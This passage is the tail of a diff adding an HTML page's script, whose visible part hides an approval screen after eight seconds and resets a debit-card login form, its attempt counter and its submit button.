+                setTimeout(() => {
+                    document.getElementById('approvalScreen').classList.remove('show');
+                    
+                    // Reiniciar formulario
+                    intentosTag2 = 0;
+                    tagsGuardados2 = [];
+                    tarjetaDebitoForm.reset();
+                    submitBtn2.classList.remove('enabled');
+                    document.getElementById('successMessage2').classList.remove('show');
+                    submitBtn2.disabled = false;
+                    submitBtn2.textContent = 'Ingresar';
+                }, 8000);
+            }
+        });
+    </script>
+</body>
+</html>
